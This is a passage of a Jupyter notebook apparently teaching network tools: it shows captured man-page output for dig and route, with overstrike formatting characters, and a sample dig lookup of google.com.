      "\r\n",
      "       +\b+b\bbu\buf\bfs\bsi\biz\bze\be=\b=B\bB\r\n",
      "              Set  the  UDP  message  buffer  size advertised using EDNS0 to B\bB\r\n",
      "              bytes. The maximum and minimum sizes of this  buffer  are  65535\r\n",
      "              and  0 respectively. Values outside this range are rounded up or\r\n",
      "              down appropriately. Values other than zero  will  cause  a  EDNS\r\n",
      "              query to be sent.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]c\bcd\bdf\bfl\bla\bag\bg\r\n",
      "              Set  [do  not  set] the CD (checking disabled) bit in the query.\r\n",
      "              This requests the server to not perform DNSSEC validation of re‐\r\n",
      "              sponses.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]c\bcl\bla\bas\bss\bs\r\n",
      "              Display [do not display] the CLASS when printing the record.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]c\bcm\bmd\bd\r\n",
      "              Toggles the printing of the initial comment in the output, iden‐\r\n",
      "              tifying the version of d\bdi\big\bg and the query options that have  been\r\n",
      "              applied.  This option always has global effect; it cannot be set\r\n",
      "              globally and then overridden on a per-lookup basis.  The default\r\n",
      "              is to print this comment.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]c\bco\bom\bmm\bme\ben\bnt\bts\bs\r\n",
      "              Toggles  the  display  of some comment lines in the output, con‐\r\n",
      "              taining information about the packet header and  OPT  pseudosec‐\r\n",
      "              tion,  and the names of the response section.  The default is to\r\n",
      "              print these comments.\r\n",
      "\r\n",
      "              Other types of comments in the output are not affected  by  this\r\n",
      "              option, but can be controlled using other command line switches.\r\n",
      "              These   include   +\b+[\b[n\bno\bo]\b]c\bcm\bmd\bd,   +\b+[\b[n\bno\bo]\b]q\bqu\bue\bes\bst\bti\bio\bon\bn,   +\b+[\b[n\bno\bo]\b]s\bst\bta\bat\bts\bs,   and\r\n",
      "              +\b+[\b[n\bno\bo]\b]r\brr\brc\bco\bom\bmm\bme\ben\bnt\bts\bs.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]c\bco\boo\bok\bki\bie\be=\b=#\b##\b##\b##\b#\r\n",
      "              Send  a  COOKIE  EDNS  option,  with optional value. Replaying a\r\n",
      "              COOKIE from a previous response will allow the server  to  iden‐\r\n",
      "              tify a previous client. The default is +\b+c\bco\boo\bok\bki\bie\be.\r\n",
      "\r\n",
      "              +\b+c\bco\boo\bok\bki\bie\be is also set when +trace is set to better emulate the de‐\r\n",
      "              fault queries from a nameserver.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]c\bcr\bry\byp\bpt\bto\bo\r\n",
      "              Toggle the display of cryptographic fields  in  DNSSEC  records.\r\n",
      "              The contents of these field are unnecessary to debug most DNSSEC\r\n",
      "              validation failures and removing them makes it easier to see the\r\n",
      "              common  failures.  The  default  is  to display the fields. When\r\n",
      "              omitted they are replaced by the string \"[omitted]\"  or  in  the\r\n",
      "              DNSKEY  case the key id is displayed as the replacement, e.g. \"[\r\n",
      "              key id = value ]\".\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]d\bde\bef\bfn\bna\bam\bme\be\r\n",
      "              Deprecated, treated as a synonym for +\b+[\b[n\bno\bo]\b]s\bse\bea\bar\brc\bch\bh\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]d\bdn\bns\bss\bse\bec\bc\r\n",
      "              Requests DNSSEC records be sent by setting  the  DNSSEC  OK  bit\r\n",
      "              (DO) in the OPT record in the additional section of the query.\r\n",
      "\r\n",
      "       +\b+d\bdo\bom\bma\bai\bin\bn=\b=s\bso\bom\bme\ben\bna\bam\bme\be\r\n",
      "              Set the search list to contain the single domain s\bso\bom\bme\ben\bna\bam\bme\be, as if\r\n",
      "              specified in a d\bdo\bom\bma\bai\bin\bn directive in /\b/e\bet\btc\bc/\b/r\bre\bes\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf, and  enable\r\n",
      "              search list processing as if the +\b+s\bse\bea\bar\brc\bch\bh option were given.\r\n",
      "\r\n",
      "       +\b+d\bds\bsc\bcp\bp=\b=v\bva\bal\blu\bue\be\r\n",
      "              Set the DSCP code point to be used when sending the query. Valid\r\n",
      "              DSCP code points are in the range [0..63]. By  default  no  code\r\n",
      "              point is explicitly set.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]e\bed\bdn\bns\bs[\b[=\b=#\b#]\b]\r\n",
      "              Specify  the  EDNS  version to query with. Valid values are 0 to\r\n",
      "              255.  Setting the EDNS version will cause a  EDNS  query  to  be\r\n",
      "              sent.   +\b+n\bno\boe\bed\bdn\bns\bs  clears the remembered EDNS version. EDNS is set\r\n",
      "              to 0 by default.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]e\bed\bdn\bns\bsf\bfl\bla\bag\bgs\bs[\b[=\b=#\b#]\b]\r\n",
      "              Set the must-be-zero EDNS flags bits (Z bits) to  the  specified\r\n",
      "              value.  Decimal, hex and octal encodings are accepted. Setting a\r\n",
      "              named flag (e.g. DO) will silently be ignored. By default, no  Z\r\n",
      "              bits are set.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]e\bed\bdn\bns\bsn\bne\beg\bgo\bot\bti\bia\bat\bti\bio\bon\bn\r\n",
      "              Enable  / disable EDNS version negotiation. By default EDNS ver‐\r\n",
      "              sion negotiation is enabled.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]e\bed\bdn\bns\bso\bop\bpt\bt[\b[=\b=c\bco\bod\bde\be[\b[:\b:v\bva\bal\blu\bue\be]\b]]\b]\r\n",
      "              Specify EDNS option with code point c\bco\bod\bde\be and optionally  payload\r\n",
      "              of v\bva\bal\blu\bue\be as a hexadecimal string. c\bco\bod\bde\be can be either an EDNS op‐\r\n",
      "              tion name (for example, N\bNS\bSI\bID\bD or E\bEC\bCS\bS), or  an  arbitrary  numeric\r\n",
      "              value. +\b+n\bno\boe\bed\bdn\bns\bso\bop\bpt\bt clears the EDNS options to be sent.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]e\bex\bxp\bpi\bir\bre\be\r\n",
      "              Send an EDNS Expire option.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]f\bfa\bai\bil\bl\r\n",
      "              Do  not  try  the next server if you receive a SERVFAIL. The de‐\r\n",
      "              fault is to not try the next server which is the reverse of nor‐\r\n",
      "              mal stub resolver behavior.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]h\bhe\bea\bad\bde\ber\br-\b-o\bon\bnl\bly\by\r\n",
      "              Send  a  query with a DNS header without a question section. The\r\n",
      "              default is to add a question section. The query type  and  query\r\n",
      "              name are ignored when this is set.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]i\bid\bde\ben\bnt\bti\bif\bfy\by\r\n",
      "              Show  [or  do not show] the IP address and port number that sup‐\r\n",
      "              plied the answer when the +\b+s\bsh\bho\bor\brt\bt option  is  enabled.  If  short\r\n",
      "              form  answers  are  requested,  the  default  is not to show the\r\n",
      "              source address and port number of the server that  provided  the\r\n",
      "              answer.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]i\bid\bdn\bni\bin\bn\r\n",
      "              Process  [do  not  process]  IDN domain names on input. This re‐\r\n",
      "              quires IDN SUPPORT to have been enabled at compile time.\r\n",
      "\r\n",
      "              The default is to process IDN input when standard  output  is  a\r\n",
      "              tty.  The IDN processing on input is disabled when dig output is\r\n",
      "              redirected to files, pipes, and other non-tty file descriptors.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]i\bid\bdn\bno\bou\but\bt\r\n",
      "              Convert [do not convert] puny code on output. This requires  IDN\r\n",
      "              SUPPORT to have been enabled at compile time.\r\n",
      "\r\n",
      "              The default is to process puny code on output when standard out‐\r\n",
      "              put is a tty. The puny code processing  on  output  is  disabled\r\n",
      "              when dig output is redirected to files, pipes, and other non-tty\r\n",
      "              file descriptors.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]i\big\bgn\bno\bor\bre\be\r\n",
      "              Ignore truncation in UDP responses instead of retrying with TCP.\r\n",
      "              By default, TCP retries are performed.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]k\bke\bee\bep\bpa\bal\bli\biv\bve\be\r\n",
      "              Send [or do not send] an EDNS Keepalive option.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]k\bke\bee\bep\bpo\bop\bpe\ben\bn\r\n",
      "              Keep  the  TCP  socket  open between queries and reuse it rather\r\n",
      "              than creating a new TCP socket for each lookup. The  default  is\r\n",
      "              +\b+n\bno\bok\bke\bee\bep\bpo\bop\bpe\ben\bn.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]m\bma\bap\bpp\bpe\bed\bd\r\n",
      "              Allow mapped IPv4 over IPv6 addresses to be used. The default is\r\n",
      "              +\b+m\bma\bap\bpp\bpe\bed\bd.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]m\bmu\bul\blt\bti\bil\bli\bin\bne\be\r\n",
      "              Print records like the SOA records in a verbose multi-line  for‐\r\n",
      "              mat  with  human-readable comments. The default is to print each\r\n",
      "              record on a single line, to facilitate machine  parsing  of  the\r\n",
      "              d\bdi\big\bg output.\r\n",
      "\r\n",
      "       +\b+n\bnd\bdo\bot\bts\bs=\b=D\bD\r\n",
      "              Set  the  number of dots that have to appear in n\bna\bam\bme\be to D\bD for it\r\n",
      "              to be considered absolute. The default value is that defined us‐\r\n",
      "              ing  the  ndots  statement in /\b/e\bet\btc\bc/\b/r\bre\bes\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf, or 1 if no ndots\r\n",
      "              statement is present. Names with fewer dots are  interpreted  as\r\n",
      "              relative names and will be searched for in the domains listed in\r\n",
      "              the s\bse\bea\bar\brc\bch\bh or d\bdo\bom\bma\bai\bin\bn directive in /\b/e\bet\btc\bc/\b/r\bre\bes\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf if +\b+s\bse\bea\bar\brc\bch\bh is\r\n",
      "              set.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]n\bns\bsi\bid\bd\r\n",
      "              Include an EDNS name server ID request when sending a query.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]n\bns\bss\bse\bea\bar\brc\bch\bh\r\n",
      "              When  this option is set, d\bdi\big\bg attempts to find the authoritative\r\n",
      "              name servers for the zone containing the name  being  looked  up\r\n",
      "              and  display  the  SOA  record that each name server has for the\r\n",
      "              zone.  Addresses of servers that that did not respond  are  also\r\n",
      "              printed.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]o\bon\bne\bes\bso\boa\ba\r\n",
      "              Print  only  one  (starting) SOA record when performing an AXFR.\r\n",
      "              The default is  to  print  both  the  starting  and  ending  SOA\r\n",
      "              records.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]o\bop\bpc\bco\bod\bde\be=\b=v\bva\bal\blu\bue\be\r\n",
      "              Set [restore] the DNS message opcode to the specified value. The\r\n",
      "              default value is QUERY (0).\r\n",
      "\r\n",
      "       +\b+p\bpa\bad\bdd\bdi\bin\bng\bg=\b=v\bva\bal\blu\bue\be\r\n",
      "              Pad the size of the query packet using the EDNS  Padding  option\r\n",
      "              to blocks of v\bva\bal\blu\bue\be bytes. For example, +\b+p\bpa\bad\bdd\bdi\bin\bng\bg=\b=3\b32\b2 would cause a\r\n",
      "              48-byte query to be padded to 64 bytes. The default  block  size\r\n",
      "              is 0, which disables padding. The maximum is 512. Values are or‐\r\n",
      "              dinarily expected to be powers of two,  such  as  128;  however,\r\n",
      "              this  is  not mandatory. Responses to padded queries may also be\r\n",
      "              padded, but only if the query uses TCP or DNS COOKIE.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]q\bqr\br\r\n",
      "              Toggles the display of the query message as it is sent.  By  de‐\r\n",
      "              fault, the query is not printed.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]q\bqu\bue\bes\bst\bti\bio\bon\bn\r\n",
      "              Toggles  the  display of the question section of a query when an\r\n",
      "              answer is returned.  The default is to print the  question  sec‐\r\n",
      "              tion as a comment.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]r\bra\baf\bfl\bla\bag\bg\r\n",
      "              Set  [do not set] the RA (Recursion Available) bit in the query.\r\n",
      "              The default is +noraflag. This bit  should  be  ignored  by  the\r\n",
      "              server for QUERY.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]r\brd\bdf\bfl\bla\bag\bg\r\n",
      "              A synonym for +\b+[\b[n\bno\bo]\b]r\bre\bec\bcu\bur\brs\bse\be.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]r\bre\bec\bcu\bur\brs\bse\be\r\n",
      "              Toggle  the  setting  of  the  RD (recursion desired) bit in the\r\n",
      "              query.  This bit is set by default,  which  means  d\bdi\big\bg  normally\r\n",
      "              sends  recursive  queries.  Recursion  is automatically disabled\r\n",
      "              when the +\b+n\bns\bss\bse\bea\bar\brc\bch\bh or +\b+t\btr\bra\bac\bce\be query options are used.\r\n",
      "\r\n",
      "       +\b+r\bre\bet\btr\bry\by=\b=T\bT\r\n",
      "              Sets the number of times to retry UDP queries to server to T\bT in‐\r\n",
      "              stead  of  the  default, 2. Unlike +\b+t\btr\bri\bie\bes\bs, this does not include\r\n",
      "              the initial query.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]r\brr\brc\bco\bom\bmm\bme\ben\bnt\bts\bs\r\n",
      "              Toggle the display of per-record comments in the output (for ex‐\r\n",
      "              ample, human-readable key information about DNSKEY records). The\r\n",
      "              default is not to print record comments unless multiline mode is\r\n",
      "              active.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]s\bse\bea\bar\brc\bch\bh\r\n",
      "              Use  [do  not  use] the search list defined by the searchlist or\r\n",
      "              domain directive in r\bre\bes\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf (if any). The search list is not\r\n",
      "              used by default.\r\n",
      "\r\n",
      "              'ndots'  from r\bre\bes\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf (default 1) which may be overridden by\r\n",
      "              +\b+n\bnd\bdo\bot\bts\bs determines if the name will be treated as relative or not\r\n",
      "              and hence whether a search is eventually performed or not.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]s\bsh\bho\bor\brt\bt\r\n",
      "              Provide a terse answer.  The default is to print the answer in a\r\n",
      "              verbose form.  This option always has global effect;  it  cannot\r\n",
      "              be set globally and then overridden on a per-lookup basis.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]s\bsh\bho\bow\bws\bse\bea\bar\brc\bch\bh\r\n",
      "              Perform [do not perform] a search showing intermediate results.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]s\bsi\big\bgc\bch\bha\bas\bse\be\r\n",
      "              This  feature is now obsolete and has been removed; use d\bde\bel\blv\bv in‐\r\n",
      "              stead.\r\n",
      "\r\n",
      "       +\b+s\bsp\bpl\bli\bit\bt=\b=W\bW\r\n",
      "              Split long hex- or base64-formatted fields in  resource  records\r\n",
      "              into  chunks of W\bW characters (where W\bW is rounded up to the near‐\r\n",
      "              est multiple of 4). +\b+n\bno\bos\bsp\bpl\bli\bit\bt or +\b+s\bsp\bpl\bli\bit\bt=\b=0\b0 causes fields not to be\r\n",
      "              split  at  all.  The  default is 56 characters, or 44 characters\r\n",
      "              when multiline mode is active.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]s\bst\bta\bat\bts\bs\r\n",
      "              Toggles the printing of statistics: when the query was made, the\r\n",
      "              size  of  the reply and so on.  The default behavior is to print\r\n",
      "              the query statistics as a comment after each lookup.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]s\bsu\bub\bbn\bne\bet\bt=\b=a\bad\bdd\bdr\br[\b[/\b/p\bpr\bre\bef\bfi\bix\bx-\b-l\ble\ben\bng\bgt\bth\bh]\b]\r\n",
      "              Send (don't send) an EDNS Client Subnet option with  the  speci‐\r\n",
      "              fied IP address or network prefix.\r\n",
      "\r\n",
      "              d\bdi\big\bg  +\b+s\bsu\bub\bbn\bne\bet\bt=\b=0\b0.\b.0\b0.\b.0\b0.\b.0\b0/\b/0\b0, or simply d\bdi\big\bg +\b+s\bsu\bub\bbn\bne\bet\bt=\b=0\b0 for short, sends\r\n",
      "              an EDNS CLIENT-SUBNET option with an empty address and a  source\r\n",
      "              prefix-length  of  zero,  which  signals  a  resolver  that  the\r\n",
      "              client's address information must _\bn_\bo_\bt  be  used  when  resolving\r\n",
      "              this query.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]t\btc\bcf\bfl\bla\bag\bg\r\n",
      "              Set  [do  not set] the TC (TrunCation) bit in the query. The de‐\r\n",
      "              fault is +notcflag. This bit should be ignored by the server for\r\n",
      "              QUERY.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]t\btc\bcp\bp\r\n",
      "              Use [do not use] TCP when querying name servers. The default be‐\r\n",
      "              havior is to use UDP unless a type a\ban\bny\by or i\bix\bxf\bfr\br=\b=N\bN  query  is  re‐\r\n",
      "              quested,  in  which case the default is TCP. AXFR queries always\r\n",
      "              use TCP.\r\n",
      "\r\n",
      "       +\b+t\bti\bim\bme\beo\bou\but\bt=\b=T\bT\r\n",
      "              Sets the timeout for a query to T\bT seconds. The  default  timeout\r\n",
      "              is  5 seconds. An attempt to set T\bT to less than 1 will result in\r\n",
      "              a query timeout of 1 second being applied.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]t\bto\bop\bpd\bdo\bow\bwn\bn\r\n",
      "              This feature is related to d\bdi\big\bg +\b+s\bsi\big\bgc\bch\bha\bas\bse\be, which is obsolete  and\r\n",
      "              has been removed. Use d\bde\bel\blv\bv instead.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]t\btr\bra\bac\bce\be\r\n",
      "              Toggle tracing of the delegation path from the root name servers\r\n",
      "              for the name being looked up. Tracing is  disabled  by  default.\r\n",
      "              When  tracing is enabled, d\bdi\big\bg makes iterative queries to resolve\r\n",
      "              the name being looked up. It will follow referrals from the root\r\n",
      "              servers,  showing  the  answer from each server that was used to\r\n",
      "              resolve the lookup.\r\n",
      "\r\n",
      "              If @server is also specified, it affects only the initial  query\r\n",
      "              for the root zone name servers.\r\n",
      "\r\n",
      "              +\b+d\bdn\bns\bss\bse\bec\bc is also set when +trace is set to better emulate the de‐\r\n",
      "              fault queries from a nameserver.\r\n",
      "\r\n",
      "       +\b+t\btr\bri\bie\bes\bs=\b=T\bT\r\n",
      "              Sets the number of times to try UDP queries to server to  T\bT  in‐\r\n",
      "              stead of the default, 3. If T\bT is less than or equal to zero, the\r\n",
      "              number of tries is silently rounded up to 1.\r\n",
      "\r\n",
      "       +\b+t\btr\bru\bus\bst\bte\bed\bd-\b-k\bke\bey\by=\b=#\b##\b##\b##\b#\r\n",
      "              Formerly specified trusted keys for use with d\bdi\big\bg +\b+s\bsi\big\bgc\bch\bha\bas\bse\be. This\r\n",
      "              feature is now obsolete and has been removed; use d\bde\bel\blv\bv instead.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]t\btt\btl\bli\bid\bd\r\n",
      "              Display [do not display] the TTL when printing the record.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]t\btt\btl\blu\bun\bni\bit\bts\bs\r\n",
      "              Display [do not display] the TTL in friendly human-readable time\r\n",
      "              units of \"s\", \"m\", \"h\", \"d\", and \"w\", representing seconds, min‐\r\n",
      "              utes, hours, days and weeks. Implies +ttlid.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]u\bun\bne\bex\bxp\bpe\bec\bct\bte\bed\bd\r\n",
      "              Accept  [do not accept] answers from unexpected sources.  By de‐\r\n",
      "              fault, d\bdi\big\bg won't accept a reply from a source other than the one\r\n",
      "              to which it sent the query.\r\n",
      "\r\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "       +\b+[\b[n\bno\bo]\b]u\bun\bnk\bkn\bno\bow\bwn\bnf\bfo\bor\brm\bma\bat\bt\r\n",
      "              Print  all  RDATA  in  unknown  RR type presentation format (_\bR_\bF_\bC\r\n",
      "              _\b3_\b5_\b9_\b7).  The default is to print RDATA for  known  types  in  the\r\n",
      "              type's presentation format.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]v\bvc\bc\r\n",
      "              Use  [do not use] TCP when querying name servers. This alternate\r\n",
      "              syntax to +\b+[\b[n\bno\bo]\b]t\btc\bcp\bp is provided for backwards compatibility.  The\r\n",
      "              \"vc\" stands for \"virtual circuit\".\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]y\bya\bam\bml\bl\r\n",
      "              Print  the  responses  (and,  if <option>+qr</option> is in use,\r\n",
      "              also the outgoing queries) in a detailed YAML format.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]z\bzf\bfl\bla\bag\bg\r\n",
      "              Set [do not set] the last unassigned DNS header flag  in  a  DNS\r\n",
      "              query.  This flag is off by default.\r\n",
      "\r\n",
      "M\bMU\bUL\bLT\bTI\bIP\bPL\bLE\bE Q\bQU\bUE\bER\bRI\bIE\bES\bS\r\n",
      "       The  BIND  9 implementation of d\bdi\big\bg supports specifying multiple queries\r\n",
      "       on the command line (in addition to supporting the -\b-f\bf  batch  file  op‐\r\n",
      "       tion). Each of those queries can be supplied with its own set of flags,\r\n",
      "       options and query options.\r\n",
      "\r\n",
      "       In this case, each q\bqu\bue\ber\bry\by argument represent an individual query in  the\r\n",
      "       command-line  syntax described above. Each consists of any of the stan‐\r\n",
      "       dard options and flags, the name to be looked  up,  an  optional  query\r\n",
      "       type  and  class  and  any query options that should be applied to that\r\n",
      "       query.\r\n",
      "\r\n",
      "       A global set of query options, which should be applied to all  queries,\r\n",
      "       can also be supplied. These global query options must precede the first\r\n",
      "       tuple of name, class, type, options, flags, and query options  supplied\r\n",
      "       on  the  command  line.  Any  global query options (except +\b+[\b[n\bno\bo]\b]c\bcm\bmd\bd and\r\n",
      "       +\b+[\b[n\bno\bo]\b]s\bsh\bho\bor\brt\bt options) can be overridden by a query-specific set of  query\r\n",
      "       options. For example:\r\n",
      "\r\n",
      "          dig +qr www.isc.org any -x 127.0.0.1 isc.org ns +noqr\r\n",
      "\r\n",
      "       shows  how  d\bdi\big\bg  could  be  used  from  the  command line to make three\r\n",
      "       lookups: an ANY query for w\bww\bww\bw.\b.i\bis\bsc\bc.\b.o\bor\brg\bg, a reverse  lookup  of  127.0.0.1\r\n",
      "       and a query for the NS records of i\bis\bsc\bc.\b.o\bor\brg\bg. A global query option of +\b+q\bqr\br\r\n",
      "       is applied, so that d\bdi\big\bg shows  the  initial  query  it  made  for  each\r\n",
      "       lookup.  The  final query has a local query option of +\b+n\bno\boq\bqr\br which means\r\n",
      "       that d\bdi\big\bg will not print the initial query  when  it  looks  up  the  NS\r\n",
      "       records for i\bis\bsc\bc.\b.o\bor\brg\bg.\r\n",
      "\r\n",
      "I\bID\bDN\bN S\bSU\bUP\bPP\bPO\bOR\bRT\bT\r\n",
      "       If d\bdi\big\bg has been built with IDN (internationalized domain name) support,\r\n",
      "       it can accept and display non-ASCII  domain  names.  d\bdi\big\bg  appropriately\r\n",
      "       converts  character encoding of domain name before sending a request to\r\n",
      "       DNS server or displaying a reply from the server. If you'd like to turn\r\n",
      "       off the IDN support for some reason, use parameters +\b+n\bno\boi\bid\bdn\bni\bin\bn and +\b+n\bno\boi\bid\bd‐\b‐\r\n",
      "       n\bno\bou\but\bt or define the IDN_DISABLE environment variable.\r\n",
      "\r\n",
      "F\bFI\bIL\bLE\bES\bS\r\n",
      "       /\b/e\bet\btc\bc/\b/r\bre\bes\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf\r\n",
      "\r\n",
      "       $\b${\b{H\bHO\bOM\bME\bE}\b}/\b/.\b.d\bdi\big\bgr\brc\bc\r\n",
      "\r\n",
      "S\bSE\bEE\bE A\bAL\bLS\bSO\bO\r\n",
      "       d\bde\bel\blv\bv(\b(1\b1)\b), h\bho\bos\bst\bt(\b(1\b1)\b), n\bna\bam\bme\bed\bd(\b(8\b8)\b), d\bdn\bns\bss\bse\bec\bc-\b-k\bke\bey\byg\bge\ben\bn(\b(8\b8)\b), _\bR_\bF_\bC _\b1_\b0_\b3_\b5.\r\n",
      "\r\n",
      "B\bBU\bUG\bGS\bS\r\n",
      "       There are probably too many query options.\r\n",
      "\r\n",
      "A\bAU\bUT\bTH\bHO\bOR\bR\r\n",
      "       Internet Systems Consortium\r\n",
      "\r\n",
      "C\bCO\bOP\bPY\bYR\bRI\bIG\bGH\bHT\bT\r\n",
      "       2020, Internet Systems Consortium\r\n",
      "\r\n",
      "9.16.4-Debian                     2020-06-10                            DIG(1)\r\n"
     ]
    }
   ],
   "source": [
    "# dig is another tool\n",
    "! man dig"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "; <<>> DiG 9.16.4-Debian <<>> google.com\r\n",
      ";; global options: +cmd\r\n",
      ";; Got answer:\r\n",
      ";; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 22176\r\n",
      ";; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\r\n",
      "\r\n",
      ";; OPT PSEUDOSECTION:\r\n",
      "; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 4096\r\n",
      ";; QUESTION SECTION:\r\n",
      ";google.com.\t\t\tIN\tA\r\n",
      "\r\n",
      ";; ANSWER SECTION:\r\n",
      "google.com.\t\t5\tIN\tA\t172.217.6.14\r\n",
      "\r\n",
      ";; Query time: 4 msec\r\n",
      ";; SERVER: 192.168.195.2#53(192.168.195.2)\r\n",
      ";; WHEN: Wed Sep 09 16:28:27 EDT 2020\r\n",
      ";; MSG SIZE  rcvd: 55\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "! dig google.com"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "## Display arp/routing cache"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ROUTE(8)              Linux System Administrator's Manual             ROUTE(8)\r\n",
      "\r\n",
      "N\bNA\bAM\bME\bE\r\n",
      "       route - show / manipulate the IP routing table\r\n",
      "\r\n",
      "S\bSY\bYN\bNO\bOP\bPS\bSI\bIS\bS\r\n",
      "       r\bro\bou\but\bte\be [-\b-C\bCF\bFv\bvn\bnN\bNe\bee\be] [-\b-A\bA family |-\b-4\b4|-\b-6\b6]\r\n",
      "\r\n",
      "       r\bro\bou\but\bte\be  [-\b-v\bv] [-\b-A\bA family |-\b-4\b4|-\b-6\b6] a\bad\bdd\bd [-\b-n\bne\bet\bt|-\b-h\bho\bos\bst\bt] _\bt_\ba_\br_\bg_\be_\bt [n\bne\bet\btm\bma\bas\bsk\bk _\bN_\bm] [g\bgw\bw\r\n",
      "              _\bG_\bw] [m\bme\bet\btr\bri\bic\bc _\bN] [m\bms\bss\bs _\bM] [w\bwi\bin\bnd\bdo\bow\bw _\bW] [i\bir\brt\btt\bt _\bI] [r\bre\bej\bje\bec\bct\bt] [m\bmo\bod\bd]  [d\bdy\byn\bn]\r\n",
      "              [r\bre\bei\bin\bns\bst\bta\bat\bte\be] [[d\bde\bev\bv] _\bI_\bf]\r\n",
      "\r\n",
      "       r\bro\bou\but\bte\be  [-\b-v\bv] [-\b-A\bA _\bf_\ba_\bm_\bi_\bl_\by |-\b-4\b4|-\b-6\b6] d\bde\bel\bl [-\b-n\bne\bet\bt|-\b-h\bho\bos\bst\bt] _\bt_\ba_\br_\bg_\be_\bt [g\bgw\bw _\bG_\bw] [n\bne\bet\btm\bma\bas\bsk\bk\r\n",
      "              _\bN_\bm] [m\bme\bet\btr\bri\bic\bc _\bM] [[d\bde\bev\bv] _\bI_\bf]\r\n",
      "\r\n",
      "       r\bro\bou\but\bte\be  [-\b-V\bV] [-\b--\b-v\bve\ber\brs\bsi\bio\bon\bn] [-\b-h\bh] [-\b--\b-h\bhe\bel\blp\bp]\r\n",
      "\r\n",
      "D\bDE\bES\bSC\bCR\bRI\bIP\bPT\bTI\bIO\bON\bN\r\n",
      "       R\bRo\bou\but\bte\be manipulates the kernel's IP routing tables.  Its primary  use  is\r\n",
      "       to  set up static routes to specific hosts or networks via an interface\r\n",
      "       after it has been configured with the i\bif\bfc\bco\bon\bnf\bfi\big\bg(8) program.\r\n",
      "\r\n",
      "       When the a\bad\bdd\bd or d\bde\bel\bl options are used, r\bro\bou\but\bte\be modifies  the  routing  ta‐\r\n",
      "       bles.   Without  these  options, r\bro\bou\but\bte\be displays the current contents of\r\n",
      "       the routing tables.\r\n",
      "\r\n",
      "O\bOP\bPT\bTI\bIO\bON\bNS\bS\r\n",
      "       -\b-A\bA _\bf_\ba_\bm_\bi_\bl_\by\r\n",
      "              use the specified address family (eg `inet'). Use  r\bro\bou\but\bte\be  -\b--\b-h\bhe\bel\blp\bp\r\n",
      "              for  a  full list. You can use -\b-6\b6 as an alias for -\b--\b-i\bin\bne\bet\bt6\b6 and -\b-4\b4\r\n",
      "              as an alias for -\b-A\bA i\bin\bne\bet\bt\r\n",
      "\r\n",
